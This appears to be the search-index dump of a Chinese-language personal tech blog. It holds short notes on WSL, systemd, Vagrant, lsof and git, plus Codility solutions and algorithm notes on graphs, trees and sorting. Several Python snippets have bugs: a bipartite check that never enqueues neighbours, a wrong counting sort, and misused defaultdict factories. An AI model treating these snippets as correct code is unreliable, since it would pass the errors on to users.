&lt;InstallLocation&gt; &lt;FileName&gt;\n\nfilename就是tar檔\nInstallLocation就是解壓的tar檔要放哪\nDistributionName就是方便識別的名字，wsl --list會出現的名字\n\n\n\n\n進去，跑之後的設定\n\nresolv.conf\nnew user\nupdate, upgrade\n等等會在安裝linux時做的事，詳細可以看\n\nbuildroot的postinstall\narch的安裝tutorial\n\n\n\n\n\nRef\n浅谈linux中的根文件系统（rootfs的原理和介绍）\n專題五 - 建立 rootfs 的無磁碟 Linux 系統環境\nExport and Import WSL Linux Distro in Windows 10\nInstall any distribution in WSL\n","categories":["System","Windows","Linux","Tips","Tips"]},{"title":"沒有sizeof算size","url":"/2021/10/size-without-sizeof/","content":"動機\n不知道為什麼c常出現這種問題，就記錄一下\n重點是在c中，所有資料都是數字\n\n想法\n\nNULL當成數字是0\nptr是數字(addr)\nptr++ = ptr + sizeof(type of ptr)\n\ncode\ntypedef struct&#123;    char Name[12];    int Age;    float Weight;    int RollNumber;&#125; sStudentInfo;int main() &#123;    sStudentInfo* ptr = NULL;    printf(&quot;size: %d\\n&quot;, (int)(++ptr));&#125;\nRef\nHow to find the size of structure in C without using sizeof?\nPointer arithmetic in C programming\n","categories":["C++","FAQ"]},{"title":"systemd","url":"/2021/10/systemd/","content":"動機\n紀錄\n\nunit &amp; target\n\nunit\n\nsystemd的基本單位，如果只用在service上可以直接當成service\n\n因為systemd管太多了，除了service還有像device之類有的沒的\n\nslice: 管cgroup\nscope: 追蹤不是由systemd啟動的process\nunit types\n\n\n\n\n\n\ntarget\n\n一堆unit，set of units\n\n\n\n下圖是systemd的啟動流程\n\ntarget 與 sysinit的runlevel\nRunlevelTarget0poweroff.target1rescue.target2, 3, 4multi-user.target5graphical.target6reboot.target\nunit 裡面\n有unit, install, service三個區塊\n\nunit: unit的基本描述\n\n與其他unit(與target)的順序\n\nwants與requires: 這裡面都要啟動\n\nrequires: 不然視為失敗\nwants: 但沒啟動也沒差\n\n\nafter與before: 就是順序\n\nwants與requires只是規定他們要在我之前啟動\nafter與before是規定實際上unit啟動的順序\n\n\n\n\n\n\ninstall: enable與disable會用到的section\n\nWantedBy與requiredBy: 同unit的wants與requires\n\n\nservice\n\nservice怎麼跑\ntype是 simple還是forking?\n\nsimple: 啟動後會不會卡住\n\npython3 -m SimpleHTTPServer\n\n\nforking: 敲下去後還能用shell\n\n通常是有開&amp;或是有daemonize\n\n\n\n\n\n\n\nsystemd怎麼管理service\nsystemd就是一個巨大的proxy，像是socket就是由systemd去聽，假設對應service起來，就把socket轉過去，像下面這張圖寫的，所以service可以同時啟動!!\n\nRef\nSystemd: Requires vs wants\nrunlevel\n认识 systemd\n","categories":["System","Linux","Tips"]},{"title":"更新fork的repo的branch","url":"/2021/10/update-forked-repo-branch/","content":"動機\n記錄用\n\nSol\n\ngit remote add upstream &lt;url&gt;\ngit fetch upstream\ngit rebase upstream/master\ngit push origin master --force\n\n","categories":["Utils","Git"]},{"title":"有用的連結","url":"/2021/10/useful-resources/","content":"動機\n紀錄\n\nurls\n房租簽約要注意哪些重點？三分鐘教你判斷合約好壞\n【密技】台灣軟體業業界現況詳解、軟體工程師指南\n哪些事是你当了领导才明白的？\n【心得】勞基法自保之道(勞方)\n信任的演化\n哈佛大學談判學程參與有感\n荷蘭PM工作筆記：三個步驟協助工作團隊的「雷隊友」一起進步\n這是一個創業失敗的故事-青創的現實提醒與四個叮嚀\n接案最先碰到的問題 — 案源從哪裡來？\n林超：给年轻人的跨学科通识课\n【構圖】從電影學習精彩構圖 \n工作\n【轉職必看】面試後端工程師，我該準備什麼作品集？\n經歷就是「秀肌肉」：多想五分鐘，救活你的履歷\n撰寫履歷：如何吸引賞識你的人\n程式設計師的履歷撰寫要點\n原來104徵才系統是這樣找人的\n語言與日文學習\n發音要自學照我這樣做，過程簡單又快速\n昔話法廷\n滑舌を良くする早口言葉の練習方法とは？\n留學申請 — TOEFL 自修備考心得分享\n留學經驗\n留美碩士經驗分享：到美國讀研究所總共要花多少錢？\n如果知道這條路充滿地雷仍堅持「千萬人吾往矣」，那就來念博士吧\n繪畫\n漫畫創作、繪圖教學整理\n繪圖教學資源整理\n【心得】內容優質學習畫畫的免費線上影片\n【贵哥汉化】透视入门【零基础新手向】绘画教程\n人を描くのって楽しいね\n【心得】【進步史】練習的方法與個人認為畫力進步的要點\n【電繪心得】線稿的層級\n【心得】繪圖學習個人經驗\nsensei\n資安\n我們與 OSCP 的距離\nroot-me\n","categories":["Etc"]},{"title":"在wsl2使用vagrant","url":"/2021/10/vagrant-wsl2/","content":"動機\nvm與container的使用情境不同，還是要懂\n同時這個也比docker或是k8s好懂、好操作多\n\n安裝\n\nwindows裝virtualbox\nwsl2中裝vagrant\n在bashrc中加\n\nexport VAGRANT_WSL_ENABLE_WINDOWS_ACCESS=&quot;1&quot;\nexport PATH=&quot;$PATH:/mnt/c/Program Files/Oracle/VirtualBox&quot;\n\n\n裝virtualbox_WSL2，不然ssh沒辦法用\n\n使用時\nsync file\n只能在/mnt/c之類的是windows的地方使用sync file，不然要手動去取消掉\nconfig.vm.synced_folder '.', '/vagrant', disabled: true\n複製public key\n不想打密碼\nVagrant.configure(&quot;2&quot;) do |config| config.vm.provision &quot;shell&quot; do |s|  ssh_pub_key = File.readlines(&quot;#&#123;Dir.home&#125;/.ssh/id_rsa.pub&quot;).first.strip  s.inline = &lt;&lt;-SHELL   echo  #&#123;ssh_pub_key&#125; &gt;&gt; /home/vagrant/.ssh/authorized_keys  SHELL end config.vm.network &quot;private_network&quot;, ip: &quot;192.168.50.4&quot;end\n設定private network\n主要是因為這個才用vagrant，不然想從host連到docker或是k8s的container會很痛苦\n\ncontainer預設沒有ssh，要自己裝與設定\n網路要自己喬，痛苦\n\nconfig.vm.network &quot;private_network&quot;, ip: &quot;192.168.50.4&quot;\n把serial port關掉 (only in Ubuntu)\n預設第一個serial port會打開\n起初是跑ubuntu的box不知道為什麼就是起不來，發現是kernel想往serial port打log。\n之後把serial port給disconnect就可以boot，但是很慢(&gt;3mins)。\n所以要把serial port整個關掉，這樣就正常了。\nconfig.vm.provider &quot;virtualbox&quot; do |v|    v.customize [ &quot;modifyvm&quot;, :id, &quot;--uart1&quot;, &quot;off&quot; ]end\n一次跑很多台\nVagrant.configure(&quot;2&quot;) do |config|  config.vm.define &quot;centos&quot; do |instance|    # ...  end  config.vm.define &quot;ubuntu&quot; do |instance|    # ...  endend\n總結\ndef wsl(instance, ip)  instance.vm.provision &quot;shell&quot; do |s|    ssh_pub_key = File.readlines(&quot;#&#123;Dir.home&#125;/.ssh/id_rsa.pub&quot;).first.strip    s.inline = &lt;&lt;-SHELL      echo #&#123;ssh_pub_key&#125; &gt;&gt; /home/vagrant/.ssh/authorized_keys    SHELL  end  instance.vm.synced_folder &#x27;.&#x27;, &#x27;/vagrant&#x27;, disabled: true  instance.vm.network &quot;private_network&quot;, ip: ipendVagrant.configure(&quot;2&quot;) do |config|  config.vm.define &quot;centos&quot; do |instance|    # ...  end  config.vm.define &quot;ubuntu&quot; do |instance|    instance.vm.box = &quot;hashicorp/bionic64&quot;    instance.vm.provider &quot;virtualbox&quot; do |v|      v.memory = 2048      v.cpus = 2      v.customize [ &quot;modifyvm&quot;, :id, &quot;--uart1&quot;, &quot;off&quot; ]    end        wsl(instance, &quot;192.168.50.5&quot;)  endend\nvagrant in WSL的模板\n把先設定模板位置\nexport VAGRANT_DEFAULT_TEMPLATE=~/.vagrant.d/Vagrantfile.erb\n之後打wsl的模板，放在VAGRANT_DEFAULT_TEMPLATE的位置\nVagrant.configure(&quot;2&quot;) do |config|  config.vm.define &quot;default&quot; do |instance|    instance.vm.box = &quot;&lt;%= box_name %&gt;&quot;    &lt;% if box_version -%&gt;    instance.vm.box_version = &quot;&lt;%= box_version %&gt;&quot;    &lt;% end -%&gt;    &lt;% if box_url -%&gt;    instance.vm.box_url = &quot;&lt;%= box_url %&gt;&quot;    &lt;% end -%&gt;    instance.vm.provider &quot;virtualbox&quot; do |v|      v.memory = 2048      v.cpus = 2      v.customize [ &quot;modifyvm&quot;, :id, &quot;--uart1&quot;, &quot;off&quot; ]    end        wsl(instance, YOUR_IP)  endend\n之後就是\nvagrant init ubuntu/focal64!!\nRef\nVagrant and Windows Subsystem for Linux\nmultiple-vagrant-vms-in-one-vagrantfile\nvirtualbox_WSL2\nvagrant default configuration\n","categories":["Windows","Tips"]},{"title":"誰開了檔案","url":"/2021/10/who-open-this-file/","content":"動機\n紀錄\n\n找listening port\n\n\nss -tulpn\n\nt,u: tcp, udp\nl: listening\np: 列process\nn: 別做DNS\n\n\n\nlsof -i\n\ni: 所有網路連線\n\n-i tcp:1-100\n-i udp:80\n\n\n\n\n\n這port是做什麼的\n去/etc/services看，或是google\n找誰開了file\n\nlsof &lt;your file&gt;\n\n誰開了&lt;your file&gt;\n\n\nlsof -u bee314\n\nbee314開了哪些file\n\n\nlsof -c &lt;proc&gt;\n\nproc開了哪些file\n\n\nlsof -p &lt;pid&gt;\n\npid開了哪些file\n\n\nlsof -c ^&lt;proc&gt;\n\nnot 條件\n\n\nlsof -c &lt;proc&gt; -u bee314\n\nor 條件\n\n\nlsof -a -c &lt;proc&gt; -u bee314\n\nand 條件\n\n\n\nRef\nLinux Find Out Which Process Is Listening Upon a Port\nLinux 列出行程開啟的檔案，lsof 指令用法教學與範例\n","categories":["System","Linux","Tips"]},{"title":"在wsl2用Xwindow的程式","url":"/2021/10/wsl2-xwindow/","content":"動機\n紀錄怎麼在wsl2用firefox\n\n如果有win11\n奘WSL2把顯卡驅動更新，就可以直接開firefox了\n設定DISPLAY\n去resolf.conf找對於wsl的gateway\nexport DISPLAY=$(awk '/^nameserver/ &#123;print $2; exit&#125;' /etc/resolv.conf):0\nVcXSrv\n這是windows的xwindow server，有兩個重點\n\nLanuch後，要把Disable access controll勾起來\n把設定檔存到C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n\n或是按Win+R'打'shell:startup\n\n\n\n之後\n直接call 執行檔，像是firefox，就會看到firefox出現\n","categories":["Windows","Tips"]},{"title":"平攤分析","url":"/2021/11/Amortized-Analysis/","content":"動機\n時不時看到，來搞懂他\n\n做N次直接乘N?\n以一般的雙loop，就是第一個loop乘上N就是N^2\n因為裡面的loop都是N，但是如果不是每次都是N的話?\n平攤分析\n有些操作他有worst case與一般case，同時又會跑不特定多次，像online algorithm，如果要計算他操作的成本，只看worst case不太好，應該要算跑好幾次的平均成本\n這就是平攤分析，簡單來說就是算平均\n最簡單的做法是計算累積的成本，之後除總次數\n像stack，一定是要先push，push是常數要N次，所以總成本就是N\n就算mutil-pop(可以一次pop很多)的worst case是N，但是因為stack的總成本，能給mutil-pop的總成本是N，所以用平攤分析，mutil-pop是常數\n還有其他分析法，但重點都是算 總成本 與 總次數\n像是位能法的push的平攤成本為什麼是2?\n因為做了這個操作才能，讓pop或是mutil-pop做事\nRef\nAmortized analysis\n","categories":["Algorithm","Tips"]},{"title":"Array-Inversion-Count","url":"/2021/11/Array-Inversion-Count/","content":"動機\n紀錄\n\nSol\nfrom bisect import bisect_leftdef merge(l):    if len(l) &lt; 2:        return [0,l]    else:        a, left = merge(l[:len(l)//2])        b, right = merge(l[len(l)//2:])        ret = a+b        for i in range(len(left)):            ret += bisect_left(right, left[i])        return [ret, sorted(left+right)]def solution(A):    ret = merge(A)[0]    return ret if ret &lt;= 1000000000 else -1","categories":["Algorithm","Codility"]},{"title":"樹與圖的重心、直徑","url":"/2021/11/Diameter-Centroid/","content":"動機\n紀錄\n\nTree\n直徑\n定義: 相離最遠的兩個點的距離\n\n走兩次DFS，一次到從這個點最遠，第二次是從最邊邊到最遠\n\ndep = defaultdict(int)far = Nonedef dfs(root, fa):  if root:    for child in [child for child in root.children if child is not fa]:      dep[child] = dep[fa]+1      far = max([far, child], key=lambda x: dep[x])      dfs(child, root)dfs(root, None)dep[far] = 0dfs(far, None)print(dep[far])\n\n走DFS, 紀錄每個點最高與次高的高度，兩者相加就是直徑的候選\n\ndiameter = 0def dfs(root, fa):  h1, h2 = 0, 0  if root:    for child in [child for child in root.children if child is not fa]:      h = dfs(child, root)+1      if h &gt; h1:        h1, h2 = h, h1      elif h &gt; h2:        h2 = h  diameter = max(diameter, h1+h2)  return h1\n重心\n重心: 對於樹上的每一個點，計算其所有子樹中最大的子樹節點數，這個值最小的點\n\n子樹都是指無根樹的子樹，即包括“向上”的那棵子樹，並且不包括整棵樹自身。\n\n特性:\n\n最多兩個點\n以此點為根，每顆tree的高度不大於N/2\n\n\n\n\n\nchilds = defaultdict(int) # 所有child的子樹的size總和weight = defaultdict(int) # 子樹中最多Node的子樹的sizecentroids = []# 假設知道Node總數是Ndef dfs(root, fa):  if root:    for child in [child for child in root.children if child is not fa]:      dfs(child, root)      childs[root] += childs[child]      weight[root] = max(weight[root], childs[child])    weight[root] = max(weight[root], N-weight[root])    if weight[root] &lt;= N//2:      centroids.append(root)\n樹分治 (Centroid Decomposition)\n讓圖的每個點都有一個parent，但parent都是用當前的重心\nfas = defaultdict(lambda x: None)sizes = defaultdict(int)def decompose(root, fa):  size = getSize(root, None)  centroid = getCentroid(root, None, size)  fas[centroid] = fa  for child in centroid.children:    centroid.children.remove(child)    child.children.remove(centroid)    decompose(child, centroid)def getSize(root, fa):  sizes[root] = 0  if root:    sizes[root] += 1    for child in [child for child in root.children if child is not fa]:      sizes[root] += getSize(child, root)  return sizes[root]def getCentroid(root, fa, size):  if not root:    return None  else:    for child in [child for child in root.children if child is not fa]:      if sizes[child] &gt; size//2:        return getCentroid(child, root, size)\n重鏈分解 (Heavy-light decomposition)\n在parent從child中挑一個size最大的child做heavy\nfas = defaultdict(lambda x: None)heavy = defaultdict(lambda x: None)sizes = defaultdict(int)def assignHeavy(root):  sizes[root] = 0  if root:    max_wieght = 0    for child in root.children:      child_size = assignHeavy(child)      sizes[root] += child_size      fas[child] = root      if max_wieght &lt; child_size:        max_wieght, heavy[root] = child_size, child  return sizes[root]\n之後就是走訪，先看有沒有heavy，有就先走，並assign到同一條鏈(head)\n沒有heavy就開新的鏈\nheads = defaultdict(lambda x: None)def decompose(root, head):  heads[root] = head  if heavy[root]:    decompose(heavy[root], head)  isNotInHeavy = lambda child: child is not fas[root] and child is not heavy[root]  for child in [child for child in root.children if isNotInHeavy(child)]:      decompose(child, child)\nQ: 這能幹嘛?\nA: 這裡\n圖\n直徑\n偏心距: 以最短路徑長度當作距離，找出離此點最遠的一點的距離\n直徑: 圖上所有偏心距當中最大的一個\n\n半徑: 圖上所有偏心距當中最小的一個\n\n找所有點的到別的點的最短距離，之後就是找每一點的偏心距，之後就是照定義\n// Floyd-Warshall Algorithmfor (int k=0; k&lt;10; ++k)    for (int i=0; i&lt;10; ++i)        for (int j=0; j&lt;10; ++j)            d[i][j] = min(d[i][j], d[i][k] + d[k][j]);// 計算偏心距memset(ecc, 0x7f, sizeof(ecc));for (int i=0; i&lt;10; ++i)    for (int j=0; j&lt;10; ++j)        ecc[i] = min(ecc[i], d[i][j]);// 計算直徑和半徑int diameter = 0;int radius = 1e9;for (int i=0; i&lt;10; ++i)&#123;    diameter = max(diameter, ecc[i]);    radius   = min(radius  , ecc[i]);&#125;\n重心\n計算每個點有多少點指到(入度)，之後就是用bfs把入度為0的node放到queue\n在bfs中移除node，更新移除後的入度，把入度為0的node放到queue\n等結束後，確認剩下最多兩個node\nRef\n树的直径\n树的重心\n演算法筆記 Path\nA Visual Introduction to Centroid Decomposition\nHeavy-light decomposition\n树链剖分\n","categories":["Algorithm","Classic"]},{"title":"Disappearing-Pairs","url":"/2021/11/Disappearing-Pairs/","content":"動機\n紀錄\n\nSol\ndef solution(S):    stk = []    for c in S:        if stk and stk[-1] == c:            stk.pop()        else:            stk.append(c)    return &#x27;&#x27;.join(stk)","categories":["Algorithm","Codility"]},{"title":"First-Unique","url":"/2021/11/First-Unique/","content":"動機\n紀錄\n\nSol\nfrom collections import defaultdictdef solution(A):    cnts = defaultdict(int)    idx = &#123;&#125;    for i,n in enumerate(A):        cnts[n] += 1        if n not in idx:            idx[n] = i        i = float(&#x27;inf&#x27;)    for k,v in filter(lambda kv: kv[1] == 1, cnts.items()):        i = min(i, idx[k])    return A[i] if i != float(&#x27;inf&#x27;) else -1","categories":["Algorithm","Codility"]},{"title":"Polygon Concavity Index","url":"/2021/11/Polygon-Concavity-Index/","content":"動機\n居然有閉包!!\nnote: cross往下是負的，cross往上是正的\n\nSol\ncross是a向量的x*b向量的y-a向量的y*b向量的x\n把a向量當成基準線，cross是負的就是b向量往下轉，正的就是往上轉\n所以只要發現有向量是往下轉的就要把之前的去掉，把這個留下來\ndef cross(c, a, b):    return (a.x - c.x)*(b.y - c.y) - (a.y - c.y)*(b.x - c.x)def solution(A):    idx = &#123;p:i for i,p in enumerate(A)&#125;    A.sort(key=lambda xy: xy.x)    down = []    up = []    for p in A:        while len(down) &gt; 1 and cross(down[-2], down[-1], p) &lt; 0:            down.pop()        down.append(p)    for p in reversed(A):        while len(up) &gt; 1 and cross(up[-2], up[-1], p) &lt; 0:            up.pop()        up.append(p)        ans = set(range(len(A))) - set(map(lambda p: idx[p], up)) - set(map(lambda p: idx[p], down))    return next(iter(ans)) if ans else -1","categories":["Algorithm","Codility"]},{"title":"分塊思想","url":"/2021/11/Sqrt-Decomposition/","content":"動機\n記錄用\n\n分塊\n通過對原數據的適當劃分，並在劃分後的每一個塊上預處理部分信息(像是sum，還可以附加訊息，像是懶標)，從而較一般的暴力算法取得更優的時間複雜度。\n分塊的時間複雜度主要取決於分塊的塊長，一般可以通過均值不等式求出某個問題下的最優塊長，以及相應的時間複雜度。\nSqrt Decomposition\n每一格用根號長度去分組，這樣q次query的整體複雜度就是O(n+q*sqrt(n))\n為什麼是根號?\n一次query要花O(n/size + size)，n/size是走了幾個完整的塊，size是剩下的item\n而這與算幾不等式很像，所以要讓n/size = size，那size就是根號\n算幾不等式\ntmp = n/size(tmp+size) / 2 &gt;= sqrt(tmp*size)\ndef sqrt_decomposition(arr):  import math  ret = []  size = math.floor(math.sqrt(len(arr)))  for i,n in enumerate(arr):    if len(ret) &lt;= i//size:      ret.append(0)    ret[-1] += n  return [ret, size]b, size = sqrt_decomposition(arr)def answer(i,j):  b_i, b_j = i//size, j//size  if b_i == b_j: # 在同一區    return sum(arr[i:j])  else:    # i ... b_i_end b_i+1_start b_i+1_end ... b_i+2_start ...... b_j_start ... j    # b_i*size+size: b_i*size還是在 i 所在的區域，所以再加一個size，跳到下一格    return sum(arr[i:(b_i*size+size)])+sum(b[b_i+1:b_j])+sum(arr[b_j*size:j])\nTODO: Mo’s algorithm\nbucket sort\n把數字分到各個桶子中\ndef bucket(arr):    but = [[] for _ in range(min(arr), max(arr))]    [but[n-min(arr)].append(n) for n in arr]    ret = []    for i in range(len(but)):        [ret.append(x) for x in but[i] if but[i]]    return ret\nworst time comp: O(讀len(arr)元素^2) (如果全部都在同一個bucket，並用insert sort去sort bucket的元素)\navg time comp: O(讀len(arr)元素 + bucket的長度)\n現在是一個數字對到一個index，但事實上可以讓一個range的數字對到一個index，這樣就有趣了\ncounting sort\n\n計數\n算prefix sum，就是看這個數字要有前面已經被占了多少格\n開始放，放完就在原本的prefix sum上加一\n\ndef counting(arr):    cnts = [0 for _ in range(min(arr), max(arr))]    # count    for n in arr:        cnts[n-min(arr)] += 1    # prefix sum    for i in range(1,len(cnts)):        cnts[i] += cnts[i-1]    # place each element    ret = list(arr)    for n in arr:        ret[n-min(arr)] = cnts[n-min(arr)]        cnts[n-min(arr)] += 1    return ret\ntime comp: O(讀len(arr)元素 + prefix sum的長度)\nradix sort\n每次用一個位數digit去sort，如果位數不存在就當0，sort到最後就是radix sort\n有趣的是，如果從最右邊(LSM，最小位數)開始走就是一般的sort，但如果從最左邊(MSM，最大位數)開始走就變成字典序!!\n126與8\ntime comp: O(幾個位數 * O(counting sort))\nRef\n分塊法\n分块思想\nSqrt Decomposition\n","categories":["Algorithm","Classic"]},{"title":"Str-Symmetry-Point","url":"/2021/11/Str-Symmetry-Point/","content":"動機\n這題目有夠爛，這根本不像是找對稱點，而是確認對稱點\n\nSol\ndef solution(S):    if len(S) % 2 == 0 or S != S[::-1]:        return -1    else:        return len(S)//2","categories":["Algorithm","Codility"]},{"title":"Tree-Height","url":"/2021/11/Tree-Height/","content":"動機\n紀錄\n\nSol\ndef solution(T):    if not T:        return -1    else:        return 1+max(solution(T.l), solution(T.r))","categories":["Algorithm","Codility"]},{"title":"神奇的圖論技巧(進階圖論)","url":"/2021/11/advanced-graph/","content":"動機\ntarjan的dfs好強!!\n\nArticulation point (tarjan的dfs)\n祖先與每一棵子樹之間都有 back edge ，則此點不是關節點\n祖先與其中一棵子樹之間缺少 back edge ，則此點就是關節點。\n怎麼確認祖先關係?\n用dfs走每一個點，給每個經過的點都標一個時間，祖先時間一定比較小\n所以只要看每個child最遠可以到哪(earliest[child])，或是說透過back edge穿越時空，只要沒有超過祖先的時間那麼祖先一定是關節點\n但根結點沒有祖先，怎麼判斷?\n有沒有一個以上的child\n接著就是怎麼找earliest\nearliest原定是每個child最遠可以到哪\n那是怎麼走，怎麼到達下一個點? (因為這與計算最遠的定義有關)\ndfs，所以earliest是透過dfs遞迴定義，但還有back edge要處理\n\n因為是用dfs，所以earliest要確認dfs能到的最遠距離\n\n\nearliest[root] = min(earliest[root], earliest[child])\n\n\n同時back edge能也走，所以要直接看他的時間，來更新earliest\n\n\nearliest[root] = min(earliest[root], child.time)\n\n同時這個earliest的演算法(tarjan)，還會再求scc看到\nearliest = defaultdict(lambda x: float(&#x27;inf&#x27;))vis = defaultdict(bool)timestamp = 1ap = []def setTime(root):  root.time = earliest[root] = timestamp  timestamp += 1def dfs(root, fa):  setTime(root)  vis[root] = True  cnt_of_child = sum(1 for child in root.chilren if not vis[child])  for child in [child for child in root.chilren if child is not fa]:    if vis[child]:      # 不在當前的dfs路徑上(back edge)，所以取時間點就好      earliest[root] = min(earliest[root], child.time)    else:      dfs(child, root)      # 在當前的dfs路徑上，所以取越遠越好      earliest[root] = min(earliest[root], earliest[child])      if root.time &lt;= earliest[child]:        # child沒辦法飛超過祖先，祖先就是ap        ap.append(root)  if fa is None and cnt_of_child &gt; 1:    # root超過一個子樹    ap.append(root)def get_ap(graph):  for root in graph.V():    if not vis[root]:      dfs(root, None)  return ap\nBridge\n基本與Articulation point一樣\n但現在存的是邊，所以\n\n不用看root是ap的case\n依舊不能飛超過祖先，但是因為這是邊，所以要把剛好落在祖先的邊去掉\n\n\nroot.time &lt;= earliest[child] =&gt; root.time &lt; earliest[child]\n\nearliest = defaultdict(lambda x: float(&#x27;inf&#x27;))vis = defaultdict(bool)timestamp = 1bri = []def setTime(root):  root.time = earliest[root] = timestamp  timestamp += 1def dfs(root, fa):  setTime(root)  vis[root] = True  for child in [child for child in root.chilren if child is not fa]:    if vis[child]:      # 不在當前的dfs路徑上(back edge)，所以取時間點就好      earliest[root] = min(earliest[root], child.time)    else:      dfs(child, root)      # 在當前的dfs路徑上，所以取越遠越好      earliest[root] = min(earliest[root], earliest[child])      if root.time &lt; earliest[child]:        # ap在root下面        bri.append((root,child))def get_ap(graph):  for root in graph.V():    if not vis[root]:      dfs(root, None)  return \nConnected Components\n就是找相連起來的部分\nvis = defaultdict(bool)def dfs(root):  ret = []  if not vis[root]:    vis[root] = True    for child in root.children:      ret += dfs(child)  return retdef cc(graph):  for root in graph.V():    if not vis[root]:      print(dfs(root))\nStrongly Connected Components\ndfs走兩次，一次是順向，第二次是逆向\n順便提一下，現在google到的作法都是分兩個dfs，一個收order，另一個收scc\n但第一個dfs的order卻放在dfs最後才收，之後再reverse，去跑第二個dfs\n但其實只要把order往前放就是順序去收order了，就不用再reverse\ndef dfs(root, vis, before):  if not vis[root]:    vis[root] = True    before(root)    [dfs(child, vis, before, after) for child in root.children]def get_scc(graph):  vis = [False] * len(graph.V())  order = []  for root in graph.V():    if not vis[root]:      dfs(root, vis, lambda root: order.append(root))    # 把所有edge反向  graph.reverse() # 又叫transpose    vis = [False] * len(graph.V())  for root in order:    if not vis[root]:      scc = []      dfs(root, vis, lambda root: scc.append(root))      print(scc)\n另一個就是利用Articulation point的方法\n題外話，Tarjan這個方法真的神\n原本ap是看child有沒有飛過祖先來判定ap，\n這裡是要scc，所以只要這個點的最早就是自己，那從這點開始的都是scc\nscc = []vis = defaultdict(bool)earliest = defaultdict(int)def dfs(root):  if not vis[root]:    nodes = [root]    vis[root] = True    for child in root.children:      if vis[child]:        earliest[root] = min(earliest[root], child.time)      else:        nodes += dfs(child, nodes + [child])        earliest[root] = min(earliest[root], earliest[child])        if earliest[root] == root.time:      scc.append(nodes)      return []    else:      return nodesdef tarjan_scc(graph):  for v in graph.V():    dfs(v)  return scc\nCycle\n一般的cycle，用3個狀態表示沒碰過、還在dfs、處理完了\n之後就是dfs\n# 0: unhandled, 1: processing, 2: donevis = defaultdict(int)def dfs(root):  if vis[root] == 0:    vis[root] = 1    for child in root.children:      if vis[root] == 1:        raise [&#x27;cycle&#x27;, root]      else:        dfs(child)def cycle(graph):  try:    for root in graph.V():      if vis[root] == 0:        dfs(root)  except e:    print(&#x27;cycle exist&#x27;)\n負環:\n\nBellman-Ford algorithm\n\nV個點，把E個邊，對應到的終點用邊去延伸\n\n如果有負環，就會有到最後還可以縮小路徑的點，就會有環\n\n\n\n\nFloyd-Warshall algorithm\n\nV個點 * V個點，再列舉V個點做中間點\n\n只要有一個距離是扣到變成負的，就會有環\n\n\n\n\n\nBipartite\n把點分成兩邊，每一點只能連到另一邊\n用bfs，去allocate所有連到的點到另一邊，之後有兩個case\n\nchild沒分配過\n\n\n就給另一邊\n\n\nchild分配過了\n\n\nGG\n\nside = defaultdict(lambda x: -1)def check_Bipartite(graph):  q = deque()  for root in graph.V():    if side[root] == -1:      side[root] = 0      q.append(root)      while q:        child = q.popLeft()        if side[child] == -1          side[child] = side[root] ^ 1        elif side[root] == side[child]:          return False  return True\nMaximum Bipartite Matching\nMaximum Bipartite Matching: 讓最多點被match掉\n\nmatch: 湊成一對，每個點不是在某一對，就是沒有在任何一對\n\n證明、相關概念很複雜，反正就是有得match就match，或是看他能不try到別的match(argument path)，直到無法match\n詳細說明看這裡\n所以可以直接用dfs一直match，每個點都try一遍\nused = defaultdict(bool)match = defaultdict(lambda x: None)def try_kuhn(root):  if used[root]:    return False  else:    used[root] = True    for child in root.children:      if not match[child] or try_kuhn(child):        match[child] = root        return True    return Falsedef lets_match(bipartile):  for v in bipartile.V():    try_kuhn(v)  return match\n因為只是一直塞match，所以可以先做一些明顯的match\ndef lets_match(bipartile):  for v in bipartile.V():    for child in v.children:      if not match[child]:        match[child] = root        used[root] = True        break    for v in bipartile.V():    try_kuhn(v)  return match\n2-SAT\n原本SAT是任意個變數or，再and\n但2-SAT是只有2個變數or(item)，再and\n這樣每個item都可以用imply(a or not b)，與交換率生出兩個imply\n之後構成一個imply graph\n之後就是求scc，看scc中有沒有x與not x同時在，有就是not sat\n整個時間都是在找scc，所以時間複雜度是O(V+E)\n2 - SAT\nEulerian path\n歐拉路徑的條件是\n\ndegree為奇數的點只能是0或是2\n\n他們就是起、終點\n\n\n剩下的degree都只能是偶數\n\ndegree就是每個點有多少edge\n所以確定圖符合條件，剩下就是隨便走出一條路，之後把所有路合併起來\n(為什麼要合併? 因為可能是cycle)\n實作就是用dfs在最後塞就好，自然就把所有路合併起來了\npath = []vis = defaultdict(bool)def dfs(root):  if not vis[root]:    vis[root] = True    for child in root.children:      dfs(child)    path.append(root)\ntree的同構\ntree hash是為了判斷tree的同構，但是python可以直接用string做hash，所以可以用任何一種序的string當成key\ntrees = defaultdict(int)def post(root):    if not root:        return &#x27;&#x27;    else:        tree = f&#x27;&#123;post(root.left)&#125;,&#123;root.val&#125;,&#123;post(root,right)&#125;&#x27;        trees[tree] += 1        return treepost(root)[print(tree) for tree,val in trees.items() if val &gt; 1]\nRef\nFinding articulation points in a graph in O(N+M)\nFinding bridges in a graph in O(N+M)\nSearch for connected components in a graph\nChecking a graph for acyclicity and finding a cycle in O(M) (M就是E)\nFinding a negative cycle in the graph\nCheck whether a graph is bipartite\nFinding strongly connected components Building condensation graph\nKuhn’s Algorithm for Maximum Bipartite Matching\n强连通分量\nFinding the Eulerian path in O(M)\n","categories":["Algorithm","Classic"]},{"title":"演算法會用到的概念","url":"/2021/11/algorithm-concepts/","content":"動機\n\n遞迴\n貫穿演算法的重點觀念\n比起說遞迴是自己call自己，遞迴其實是\n\n分解問題\n針對各個case處理，而每個case都是這個遞迴可以處理的\n\n所以寫遞迴，不是去trace (這是最後的手段)\n是思考有什麼case，之後相信下一個遞迴可以把問題處理掉\n之後針對各個case處理，最後生出需要的資料\n千萬不要跳進這個函數里面企圖探究更多細節\n遞迴出現在各處，iteration就是recursion的特例。\n同時經典演算法的重點也都是在什麼地方有遞迴，像\n\ntarjan的求ap或是scc的earliset，就是遞迴，從dfs延伸出去，再補back edge的訊息\nkmp的fail function，就是一直往前看前面fail的有沒有與現在的字一樣的位置\n\nbottom-up &amp; top-down\n遞迴有兩個方向: bottom-up &amp; top-down\n也對應到演算法處理問題的方式: 建構 &amp; 分解(再組合)\n用方向來看就是 上往下(從頭) &amp; 下往上(從尾)\n如樹形DP可以考慮兩種DP順序，一種是從根到葉子，一種是從葉子到根。\n像是建tree，可以像segment tree從range去二分，或是像huffman tree把leaf一個一個合成node\n遞迴的種類\n\n線性: List = Nil | Cons N List\n樹狀: Tree = Nil | Node N Tree Tree\n倍增: f(n) = f(f(i))\nstate: f(state1, ...) = f(state2, ...)\n其他: 像河內塔 